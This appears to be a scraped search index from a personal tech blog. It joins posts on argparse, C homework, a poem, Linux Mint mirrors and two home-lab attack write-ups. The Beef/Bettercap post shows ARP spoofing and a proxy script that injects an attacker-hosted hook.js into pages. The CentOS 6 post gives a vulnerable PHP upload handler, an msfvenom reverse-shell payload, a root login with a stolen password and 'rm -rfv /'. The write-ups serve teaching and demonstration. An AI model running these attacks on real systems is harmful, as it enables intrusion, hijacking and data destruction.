into TitleGetter 啦！ There is no need to set the location of list.txt in the configuration file anymore! The output file position does not need to be fixed either!! Reference links argparse简要用法总结 | Yunfeng’s Simple Blog argparse â Parser for command-line options, arguments and sub-commands — Python 3.9.5 documentation ","date":"2021-05-16","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-argparse/:0:0","tags":["Notes","Linux","Python","Programming"],"title":"Python Learning Notes - ArgParse","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-argparse/"},{"categories":["Penetration Testing"],"content":"Using bettercap to bind Beef hooks for browser hijacking, and using Beef-hijacked browsers to execute payloads.","date":"2021-02-02","objectID":"/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","tags":["beef","bettercap","Linux","metasploit","notes","penetration testing","ARP spoofing","hackers"],"title":"LAN Penetration Testing with Beef, Bettercap, and Other Tools","uri":"/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["Penetration Testing"],"content":"Introduction Well… Let’s start with some rambling as usual… Today, I tried using Beef and Bettercap together and found them to be quite effective~ Also, if you are using Internet Explorer (IE), you can use Beef in conjunction with the ms14-064 module in Metasploit to gain system privileges~ Without further ado, let’s get started~ ","date":"2021-02-02","objectID":"/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:1:0","tags":["beef","bettercap","Linux","metasploit","notes","penetration testing","ARP spoofing","hackers"],"title":"LAN Penetration Testing with Beef, Bettercap, and Other Tools","uri":"/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["Penetration Testing"],"content":"Testing Environment First, let’s talk about the testing environment. Attacker machine Arch Linux 192.168.101.15 Target machine Windows XP on VirtualBox 192.168.101.43 Due to limited resources, we can only use Windows XP for this demonstration~ ","date":"2021-02-02","objectID":"/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:1:1","tags":["beef","bettercap","Linux","metasploit","notes","penetration testing","ARP spoofing","hackers"],"title":"LAN Penetration Testing with Beef, Bettercap, and Other Tools","uri":"/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["Penetration Testing"],"content":"Tools Used Bettercap First and foremost, Bettercap~ It is used for ARP spoofing, DNS hijacking, and network interruption attacks, which are all part of man-in-the-middle attacks… Beef Used for browser hijacking… and it can do many things, but I don’t know the specifics. Metasploit (msf) Our old friend~ ","date":"2021-02-02","objectID":"/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:1:2","tags":["beef","bettercap","Linux","metasploit","notes","penetration testing","ARP spoofing","hackers"],"title":"LAN Penetration Testing with Beef, Bettercap, and Other Tools","uri":"/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["Penetration Testing"],"content":"Testing Process First, let’s open bettercap. $ sudo bettercap Then we will see the following output.. Note: You need to use sudo here because it requires root privileges to access network hardware such as network cards. If you don’t use sudo, you will see a prompt like this. Next, set the target for ARP spoofing: set arp.spoof.targets 192.168.101.43 Here, the targets are set to the IP address of the target machine. Next, start Beef, and remember to use sudo as mentioned earlier. $ sudo beef The output should be like this: Now, let’s talk about the links displayed in the terminal: Hook URL: http://192.168.101.15:3000/hook.js This is the hook address mentioned earlier. Once a browser visits a page with this JavaScript, it will be hooked by Beef~ Later, we will write it into an attack script~ UI URL: http://192.168.101.15:3000/ui/panel This is the Beef control panel. After opening it, you will see a login page, similar to the cover image. After logging in, it will look like this. About the username and password, here’s the thing: In some systems, you can’t use the default login credentials (beef:beef) for Beef, and it may not even start. For example, this is the case with my Arch Linux. [14:40:25][!] ERROR: Default username and password in use! [14:40:25] |_ Change the beef.credentials.passwd in config.yaml In such cases, what you need to do is modify the config.yaml file. In my case, the file is located at /usr/share/beef/config.yaml. Modify it as follows: beef: version: '0.5.0.0-alpha-pre' # More verbose messages (server-side) debug: false # More verbose messages (client-side) client_debug: false # Used for generating secure tokens crypto_default_value_length: 80 # Credentials to authenticate in BeEF. # Used by both the RESTful API and the Admin interface credentials: user: \"Choose a username\" passwd: \"Think of a password\" After that, you can start the system, and the username and password you set will be used for login. Alright, without further ado, let’s continue. Next, we need to write a JavaScript script to use with Bettercap. function onResponse(req,res){ if(res.ContentType.indexOf('text/html')==0){ var body=res.ReadBody(); if(body.indexOf('\u003c/head\u003e')!=-1){ res.Body=body.replace( '\u003c/head\u003e', '\u003cscript type=\"text/javascript\" src=\"http://192.168.101.15:3000/hook.js\"\u003e\u003c/script\u003e\u003c/head\u003e' ); } } } Save this file to a directory of your choice. I will save it to /home/weepingdogel/Downloads/hack/192.168.101.43/hack.js. Then, let’s go back to Bettercap and set the http.proxy.script parameter to the path mentioned above: set http.proxy.script /home/weepingdogel/Downloads/hack/192.168.101.43/hack.js Then start net.probe, arp.spoof, and http.proxy in sequence. net.probe on arp.spoof on http.proxy on Alright… Now everything is set up and ready to go… Then we’ll have the target machine open a browser and visit a website… Since IE8 no longer supports HTTPS for Bing, it will be vulnerable as soon as it opens. ","date":"2021-02-02","objectID":"/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:2:0","tags":["beef","bettercap","Linux","metasploit","notes","penetration testing","ARP spoofing","hackers"],"title":"LAN Penetration Testing with Beef, Bettercap, and Other Tools","uri":"/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["problem solving"],"content":"Help her write an assignment qwq","date":"2020-12-02","objectID":"/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/","tags":["C language","homework","assignment help","example"],"title":"Help with College Computer Homework","uri":"/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/"},{"categories":["problem solving"],"content":"Introduction Help with homework qwq… I haven’t played with C language for a long time, let me try to see if I can do it. PS: I’m on Linux, the execution method may be different. If you are on Windows, you need an editor to run it. For example, Dev C++, VS 2019, etc. ","date":"2020-12-02","objectID":"/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/:1:0","tags":["C language","homework","assignment help","example"],"title":"Help with College Computer Homework","uri":"/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/"},{"categories":["problem solving"],"content":"Experiment Eleven Experiment Eleven Objective: Understand C programming concepts Understand C program design framework Contents: Input a grade and output its level rating. This is straightforward. We need to list several grade levels: Excellent 80 ~ 100 points [80,100] Pass 60~79 points [60,79] Fail Below 60 points [0,60) In the code, we can use expressions to represent the intervals, for example: score \u003e= 80 \u0026\u0026 score \u003c= 100 Then we use if() to determine the grade level. #include\u003cstdio.h\u003e int main(){ int score = 85; if(score \u003e= 80 \u0026\u0026 score \u003c= 100){ printf(\"The grade is excellent\"); }else if(score \u003e= 60 \u0026\u0026 score \u003c= 79){ printf(\"The grade is pass\"); }else if(score \u003e= 0 \u0026\u0026 score \u003c 60){ printf(\"The grade is fail\"); } } Next, we run the program. Output: weepingdogel@WeepingDogel /tmp\u003e make test cc test.c -o test weepingdogel@WeepingDogel /tmp\u003e ./test The grade is excellent⏎ Then we need to get the user’s input for the grade, like this, using the scanf() function to get the user’s input and assign it to an integer variable score. #include\u003cstdio.h\u003e int main(){ int score; printf(\"Enter your grade:\"); scanf(\"%d\",\u0026score); printf(\"%d\",score); } Next, we combine these two pieces of code together. The complete code is as follows: #include\u003cstdio.h\u003e int main(){ int score; printf(\"Enter your grade:\"); scanf(\"%d\",\u0026score); if(score \u003e= 80 \u0026\u0026 score \u003c= 100){ printf(\"The grade is excellent\"); }else if(score \u003e= 60 \u0026\u0026 score \u003c= 79){ printf(\"The grade is pass\"); }else if(score \u003e= 0 \u0026\u0026 score \u003c 60){ printf(\"The grade is fail\"); } } The idea is to first use scanf() function to get the user’s input for the grade, then use if() statements to compare and output the result. This is the output: weepingdogel@WeepingDogel /tmp\u003e make test cc test.c -o test weepingdogel@WeepingDogel /tmp\u003e ./test Enter your grade:99 The grade is excellent⏎ weepingdogel@WeepingDogel /tmp\u003e ./test Enter your grade:85 The grade is excellent⏎ weepingdogel@WeepingDogel /tmp\u003e ./test Enter your grade:60 The grade is pass⏎ weepingdogel@WeepingDogel /tmp\u003e ./test Enter your grade:59 The grade is fail⏎ ","date":"2020-12-02","objectID":"/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/:2:0","tags":["C language","homework","assignment help","example"],"title":"Help with College Computer Homework","uri":"/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/"},{"categories":["problem solving"],"content":"Experiment 12 Experiment Purpose: Understand C program design ideas Understand C program design frameworks Task content Requires writing a program that registers and then logs in, outputting the format shown in the following figure: -------------------------------------- Registration Interface Please enter your registration username: Ly Please enter your registration password: 123 Congratulations! Registration successful! -------------------------------------- -------------------------------------- Login Interface Please enter your login username: Ly Please enter your login password: 123 Login successful! -------------------------------------- -------------------------------------- Login Interface Please enter your login username: Ly Please enter your login password: 1234 Login failed! -------------------------------------- Define 4 variables to save the registered username, password and login username, password respectively. Use if…else statement to complete the judgment of the username and password. To put it simply… it uses scanf() to get input, assigns the values to variables, and then performs the judgment… Pft! Alright, here’s the code, no explanation needed… #include\u003cstdio.h\u003e #include\u003cstring.h\u003e int main(){ /* Define 4 variables to save the registered username, password and login username, password respectively */ char username_sign[40]; char password_sign[16]; char username_login[40]; char password_login[16]; /* Define 4 variables to save the registered username, password and login username, password respectively */ printf(\"--------------------------------------\\n Registration Interface\\n\"); printf(\"Please enter your registration username:\"); scanf(\"%s\", username_sign); printf(\"Please enter your registration password:\"); scanf(\"%s\", password_sign); printf(\"Congratulations! Registration successful!\"); printf(\"\\n--------------------------------------\"); /* Use scanf() to get input */ printf(\"\\n\\n--------------------------------------\\n Login Interface\\n\"); printf(\"Please enter your login username:\"); scanf(\"%s\",username_login); printf(\"Please enter your login password:\"); scanf(\"%s\",password_login); /* Use if...else statement to complete the judgment of the username and password */ /* Uses the strcmp() function here */ if(strcmp(username_login,username_sign) == 0 \u0026\u0026 strcmp(password_login,password_sign) == 0){ printf(\"Login successful!\"); }else{ printf(\"Login failed!\"); } printf(\"\\n--------------------------------------\"); } However, it’s worth noting that this string comparison method is slightly different. It requires using the strcmp() function, something like this. if(strcmp(username_login,username_sign) == 0 \u0026\u0026 strcmp(password_login,password_sign) == 0){ printf(\"Login successful!\"); }else{ printf(\"Login failed!\"); } It seems to calculate a numerical value, which equals 0 if the two strings are the same. That’s roughly how it works. Let’s take a look at the output… weepingdogel@WeepingDogel /tmp\u003e make test2 cc test2.c -o test2 weepingdogel@WeepingDogel /tmp\u003e ./test2 -------------------------------------- Registration Interface Please enter your registration username:Ly Please enter your registration password:123 Congratulations! Registration successful! -------------------------------------- -------------------------------------- Login Interface Please enter your login username:Ly Please enter your login password:123 Login successful! --------------------------------------⏎ weepingdogel@WeepingDogel /tmp\u003e ./test2 -------------------------------------- Registration Interface Please enter your registration username:Ly Please enter your registration password:123 Congratulations! Registration successful! -------------------------------------- -------------------------------------- Login Interface Please enter your login username:Ly Please enter your login password:1234 Login failed! --------------------------------------⏎ And that’s it! ","date":"2020-12-02","objectID":"/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/:3:0","tags":["C language","homework","assignment help","example"],"title":"Help with College Computer Homework","uri":"/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/"},{"categories":["problem solving"],"content":"Closing Remarks Actually, there are still some details that I might overlook due to carelessness, so I can’t say “Is that it? Is that all?” But relatively speaking, it’s still quite simple… yeah… ","date":"2020-12-02","objectID":"/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/:4:0","tags":["C language","homework","assignment help","example"],"title":"Help with College Computer Homework","uri":"/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/"},{"categories":["Poem"],"content":"A poem...","date":"2020-11-29","objectID":"/posts/2020-dec-29/","tags":["Poem"],"title":"If Only I...","uri":"/posts/2020-dec-29/"},{"categories":["Poem"],"content":"PAST If only I had been stronger, I wouldn’t have been damaged by the WIND. If only I had been smarter, I wouldn’t have been cheated by the CROWD. If only I had been more brave, I wouldn’t have been thought to be a SLAVE. ","date":"2020-11-29","objectID":"/posts/2020-dec-29/:0:1","tags":["Poem"],"title":"If Only I...","uri":"/posts/2020-dec-29/"},{"categories":["Poem"],"content":"PRESENT If only I were more fortunate, I wouldn’t drop into a CAGE. If only I were more cautious, I wouldn’t have to be sure if it’s DANGEROUS. If only I worked harder, I wouldn’t be said to be a LOSER. ","date":"2020-11-29","objectID":"/posts/2020-dec-29/:0:2","tags":["Poem"],"title":"If Only I...","uri":"/posts/2020-dec-29/"},{"categories":["Poem"],"content":"Future If only I should have a future…. I would write the story continuously… If only I…. I would… ","date":"2020-11-29","objectID":"/posts/2020-dec-29/:0:3","tags":["Poem"],"title":"If Only I...","uri":"/posts/2020-dec-29/"},{"categories":["Linux"],"content":"A tutorial for beginners on modifying software sources in Linux Mint.","date":"2020-11-06","objectID":"/posts/2020-nov-6/","tags":["tutorial","Linux Mint","modifying software sources","Linux basics","apt"],"title":"How to Modify Software Sources in Linux Mint","uri":"/posts/2020-nov-6/"},{"categories":["Linux"],"content":"Introduction After installing Linux Mint, one of the first things you may want to do is modify your software sources. The default software sources in Linux Mint are official ones, which may take a long time to download and update packages. Therefore, it’s recommended to modify the software sources and use a mirror source that is closer to you. For Linux Mint, there are basically two ways to modify the software sources. Note: Choose only one of the following options. ","date":"2020-11-06","objectID":"/posts/2020-nov-6/:1:0","tags":["tutorial","Linux Mint","modifying software sources","Linux basics","apt"],"title":"How to Modify Software Sources in Linux Mint","uri":"/posts/2020-nov-6/"},{"categories":["Linux"],"content":"Method 1: Using the Terminal We’ll first go to the TUNA mirror site and take a look at the help documentation (https://mirrors.tuna.tsinghua.edu.cn/help/linuxmint/). The content is as follows: “Oh, I see. Maybe you’re having trouble understanding how to do it. Here’s a detailed guide on how to perform the operation: First, move your mouse cursor to the bottom left corner of the screen and open the Terminal.” To modify the software sources, we first need to edit the /etc/apt/sources.list file. It seems that Mint does not come with vim pre-installed, so we will use nano here. $ sudo nano /etc/apt/sources.list Note: sudo is required and do not forget to enter your password after pressing Enter in the terminal. When you open the file, you may notice that it appears empty except for some English comments. You can start writing into the file by following the instructions provided by the TUNA mirror site or other tutorial deb http://mirrors.tuna.tsinghua.edu.cn/linuxmint/ ulyana main upstream import backport I understand. To complete the process, we also need to add Ubuntu repositories as some packages in Mint require them. Let’s take a look at the Ubuntu help documentation for further instructions. Great, it sounds like you have a good understanding of the process! Yes, you can modify the URLs in the /etc/apt/sources.list file and replace archive.ubuntu.com with mirrors.tuna.tsinghua.edu.cn. This will help speed up the process of downloading and updating packages in Linux Mint. #deb cdrom:[Linux Mint 20 _Ulyana_ - Release amd64 20200624]/ focal contrib main # This system was installed using small removable media # (e.g. netinst, live or single CD). The matching \"deb cdrom\" # entries were disabled at the end of the installation process. # For information about how to configure apt package sources, # see the sources.list(5) manual. deb http://mirrors.tuna.tsinghua.edu.cn/linuxmint/ ulyana main upstream import backport deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu focal main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu focal-updates main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu focal-backports main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse Like this： Exactly! After modifying the software sources, you can run the command sudo apt update in the terminal to update the package lists. This will allow you to download and install packages much faster than before. ","date":"2020-11-06","objectID":"/posts/2020-nov-6/:2:0","tags":["tutorial","Linux Mint","modifying software sources","Linux basics","apt"],"title":"How to Modify Software Sources in Linux Mint","uri":"/posts/2020-nov-6/"},{"categories":["Linux"],"content":"Method 2: Using the Update Manager irst, click on the “Menu” button in the bottom left corner of the screen to access the applications menu. Then, search for “Settings Manager” and click on it to open the manager. Next, scroll down the Settings Manager window until you find the “Software Sources” option. Click on it to open the software sources settings. Hmm, didn’t you see it at the beginning? Yes, you are correct! The TUNA mirror site was mentioned earlier in this guide as an example of a mirror that can be used to modify the software sources. Then use this software to modify the sources to use mirrors hosted in China. However, I am not sure of the exact steps on how to do this. Oh yeah! Anyway, this is it… Just use your mouse to click around, and you’re good to go! Next, you will be prompted to update the apt cache. Click “OK” to continue. Wait for the process to finish, and you’re done! ","date":"2020-11-06","objectID":"/posts/2020-nov-6/:3:0","tags":["tutorial","Linux Mint","modifying software sources","Linux basics","apt"],"title":"How to Modify Software Sources in Linux Mint","uri":"/posts/2020-nov-6/"},{"categories":["Linux"],"content":"Updating Software Packages Once you have set up the apt software sources, the next step is to perform necessary software package updates. Here are two methods to update your software packages: Note: Still, you can choose either Method 1 or Method 2 to update your software packages. ","date":"2020-11-06","objectID":"/posts/2020-nov-6/:4:0","tags":["tutorial","Linux Mint","modifying software sources","Linux basics","apt"],"title":"How to Modify Software Sources in Linux Mint","uri":"/posts/2020-nov-6/"},{"categories":["Linux"],"content":"Method 1: Using the Terminal Open the Terminal by clicking on the “Menu” button in the bottom left corner of the screen and searching for “Terminal”. In the Terminal, type the following command and press Enter: $ sudo apt upgrade Enter your password when prompted and press Enter again. Wait for the update process to finish. Then, you can reboot your system. ","date":"2020-11-06","objectID":"/posts/2020-nov-6/:4:1","tags":["tutorial","Linux Mint","modifying software sources","Linux basics","apt"],"title":"How to Modify Software Sources in Linux Mint","uri":"/posts/2020-nov-6/"},{"categories":["Linux"],"content":"Using the Update Manager Click it! Then you just need to enter the password. Just click to install the update. 确定Click OK Screenshots are exhausting…then just wait for it to finish running. Next, restart the virtual machine and it will be ready to use. ","date":"2020-11-06","objectID":"/posts/2020-nov-6/:4:2","tags":["tutorial","Linux Mint","modifying software sources","Linux basics","apt"],"title":"How to Modify Software Sources in Linux Mint","uri":"/posts/2020-nov-6/"},{"categories":["Linux"],"content":"Conclusion First of all, I used Linux Mint 20 for demonstration, which may be updated in the future and some details in this article may differ from the actual situation, but the operations are similar. Please adjust accordingly based on your actual situation. Secondly, please don’t laugh! This article is aimed at beginners who are just starting to learn about Linux. If there are any shortcomings or small mistakes caused by carelessness, please leave a message in the Gitalk section below. Finally, this site follows the CC-BY-NC 4.0 license，please indicate the source when reprinting. ","date":"2020-11-06","objectID":"/posts/2020-nov-6/:5:0","tags":["tutorial","Linux Mint","modifying software sources","Linux basics","apt"],"title":"How to Modify Software Sources in Linux Mint","uri":"/posts/2020-nov-6/"},{"categories":["Linux"],"content":"Reference links Linux Mint | Mirror Usage Guide | Tsinghua Open Source Mirror Ubuntu | Mirror Usage Guide | Tsinghua Open Source Mirror ","date":"2020-11-06","objectID":"/posts/2020-nov-6/:6:0","tags":["tutorial","Linux Mint","modifying software sources","Linux basics","apt"],"title":"How to Modify Software Sources in Linux Mint","uri":"/posts/2020-nov-6/"},{"categories":["Penetration testing"],"content":"The meaning of updates...","date":"2020-09-26","objectID":"/posts/2020-09-26/","tags":["Linux","Thoughts","Essays","Penetration testing","Social engineering","Hackers","Updates"],"title":"Attacking CentOS6 Virtual Machines","uri":"/posts/2020-09-26/"},{"categories":["Penetration testing"],"content":" Although the penetration process is involved, this article’s main topic is not about penetration testing. Please read it with a rational mindset. ","date":"2020-09-26","objectID":"/posts/2020-09-26/:0:0","tags":["Linux","Thoughts","Essays","Penetration testing","Social engineering","Hackers","Updates"],"title":"Attacking CentOS6 Virtual Machines","uri":"/posts/2020-09-26/"},{"categories":["Penetration testing"],"content":"The reason for writing this blog post Recently, I have been hearing different opinions on software updates. On one hand, some argue that in certain cases, updating can be counterproductive, leading to unnecessary workload or even rewriting. On the other hand, others argue that continuous updates are necessary for a better user experience. I am not sure which side is right, but I am curious. I wanted to know what would happen if I do not update software, so I took it upon myself to simulate an attack on a commercial company’s server using a virtual machine. The system used was CentOS 6, and I attempted to use various tools to try and breach its security. My goal was to simulate what could happen if a company were to be targeted by hackers while still using CentOS 6.0 in 2020. ","date":"2020-09-26","objectID":"/posts/2020-09-26/:1:0","tags":["Linux","Thoughts","Essays","Penetration testing","Social engineering","Hackers","Updates"],"title":"Attacking CentOS6 Virtual Machines","uri":"/posts/2020-09-26/"},{"categories":["Penetration testing"],"content":"Simulation Environment Attacker platform: Arch Linux IP: 192.168.0.109 Victim platform: CentOS 6.1 on VirtualBox IP: 192.168.0.116 Suppose this is a company where non-technical personnel lead the technical staff, and they have not updated the software used in development (including the operating system of their development machines and servers) for a long time. We can imagine this virtual machine as their server and conduct some attack tests on it. Because the management of this company is non-technical, the software on the server not only has outdated versions but also lacks any defensive measures. Additionally, due to unsatisfactory work hours, the programmers have a “get the job done” attitude, resulting in PHP code on the backend such as this: \u003c?php if ($_FILES[\"file\"][\"error\"] \u003e 0) { echo \"Error: \" . $_FILES[\"file\"][\"error\"] . \"\u003cbr\u003e\"; } else { echo \"Uploaded file name: \" . $_FILES[\"file\"][\"name\"] . \"\u003cbr\u003e\"; echo \"File type: \" . $_FILES[\"file\"][\"type\"] . \"\u003cbr\u003e\"; echo \"File size: \" . ($_FILES[\"file\"][\"size\"] / 1024) . \" kB\u003cbr\u003e\"; echo \"Temporary storage location of file: \" . $_FILES[\"file\"][\"tmp_name\"]; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $_FILES[\"file\"][\"name\"]); echo \"File stored in: \" . \"upload/\" . $_FILES[\"file\"][\"name\"]; } ?\u003e Although the simulation has limitations, I personally believe that it is sufficient for abstract testing purposes. ","date":"2020-09-26","objectID":"/posts/2020-09-26/:2:0","tags":["Linux","Thoughts","Essays","Penetration testing","Social engineering","Hackers","Updates"],"title":"Attacking CentOS6 Virtual Machines","uri":"/posts/2020-09-26/"},{"categories":["Penetration testing"],"content":"Process of attack Someone always likes to cause trouble, and a hacker has scanned the server… $ sudo nmap -O -v 192.168.0.116 The result is as follows: Nmap scan report for 192.168.0.116 Host is up (0.00028s latency). Not shown: 998 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http MAC Address: 08:00:27:B7:2E:E5 (Oracle VirtualBox virtual NIC) Device type: general purpose Running: Linux 2.6.X|3.X OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 OS details: Linux 2.6.32 - 3.10 Uptime guess: 49.708 days (since Sat Aug 8 02:56:12 2020) Network Distance: 1 hop TCP Sequence Prediction: Difficulty=261 (Good luck!) IP ID Sequence Generation: All zeros Read data files from: /usr/bin/../share/nmap OS detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB) He was surprised to find that the kernel version was only 2.6.32, which was a first for him. In addition, there were open ports for SSH and HTTP, which gave him a good opportunity. He attempted to access the website and discovered a file upload point on the site. With a “let’s give it a try” attitude, he generated a payload using msf. $ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.109 LPORT=4444 -o shell.php He selected a file and clicked upload, and was surprised to find that not only was the upload successful, but he was also informed of its location. So he launched msfconsole. $ msfconsole And he used the exploit/multi/handler module. msf5 \u003e use exploit/multi/handler He then proceeded to set the parameters one by one. msf5 exploit(multi/handler) \u003e set LHOST 192.168.0.109 msf5 exploit(multi/handler) \u003e set LPORT 4444 set payload php/meterpreter/reverse_tcp The final step was to run the module. msf5 exploit(multi/handler) \u003e run Then msf began listening. [*] Started reverse TCP handler on 192.168.0.109:4444 At this point, he modified the file address and link as prompted and accessed it: http://192.168.0.116/upload/shell.php Msf immediately produced results. It’s easy to imagine how poor the server’s security measures were. [*] Started reverse TCP handler on 192.168.0.109:4444 [*] Sending stage (38288 bytes) to 192.168.0.116 [*] Meterpreter session 1 opened (192.168.0.109:4444 -\u003e 192.168.0.116:52350) at 2020-09-26 21:33:06 +0800 meterpreter \u003e Now he began retrieving brief system information, such as the operating system and kernel version. meterpreter \u003e sysinfo Computer : localhost OS : Linux localhost 2.6.32-754.33.1.el6.x86_64 #1 SMP Tue Aug 25 15:29:40 UTC 2020 x86_64 Meterpreter : php/linux meterpreter \u003e cat /etc/issue CentOS release 6.10 (Final) Kernel \\r on an \\m He also attempted to determine the current user’s privileges. meterpreter \u003e getuid Server username: apache (48) The permissions are still quite low, so while he may not be able to do anything that would cause significant damage to the company, he can still spy and wreak havoc. But would the hacker be satisfied with just that? The answer is no, because he wants to escalate his privileges and obtain root access, which would allow him to do whatever he wants. Due to the fact that the system and kernel of this server are too outdated, most of the code used to exploit vulnerabilities only works on kernel versions 3.x or above, or cannot be compiled at all. It looks like he needs to think of another way. During the day, he rides his motorcycle through the streets and alleys delivering food, and at night he roams the network as a hacker. By chance, he went to deliver food ordered by an employee of that company and, as he entered the office area, he accidentally saw a note stuck to a monitor. There were some numbers and letters written on it, perhaps something useful. While the employees were eating, he secretly took a picture of the note with his phone and left. As luck would have it, this note contained the password that had just been changed and would not be updated again for a while. After work, he returned to his terminal and attempted to log in directly as root using the stolen password. meterpreter \u003e shell Process 1376 created. Channel 2 created. He was able to obtain an interactive shell. /bin/sh -i sh: no job control in this shell sh-4.1$ python -c 'import pty;pty.spawn(\"/bin/bash\")' python -c 'import pty;pty.spawn(\"/bin/bash\")' bash-4.1$ He logged in successfully. bash-4.1$ su root su root Password: ************ [root@localhost upload]# As we can see, he was able to log in successfully with ease, and now he has root privileges at his fingertips. [root@localhost upload]# whoami whoami root [root@localhost upload]# id id uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:system_r:httpd_t:s0 [root@localhost upload]# Yes, he could do whatever he wanted now… And so, in the end, he proceeded to delete everything. [root@localhost upload]# rm -rfv / The company suffered significant losses as a result. ","date":"2020-09-26","objectID":"/posts/2020-09-26/:3:0","tags":["Linux","Thoughts","Essays","Penetration testing","Social engineering","Hackers","Updates"],"title":"Attacking CentOS6 Virtual Machines","uri":"/posts/2020-09-26/"},{"categories":["Penetration testing"],"content":"Conclusion Although the story above is purely fictional and the attack was only carried out in a simulated environment, it is worth pondering over what we can see… Systems that are not updated are prone to attacks. Code that is not updated is prone to vulnerabilities. Slow password updates can lead to leaks. Vulnerabilities must be fixed by updating software; otherwise, they will be exploited. And as for what we cannot see… Software is ultimately created by humans, and there is no perfection with humans. We must constantly reflect on ourselves and our creations. Whether as users or developers, updating what needs to be updated is a normal part of life. There may be differences in speed, but progress must be made. Standing still or even moving backwards is not an option. For software to be updated is like how humans need to self-reflect. If humans fail to self-reflect, their future will be bleak. If software is not updated, it will be abandoned 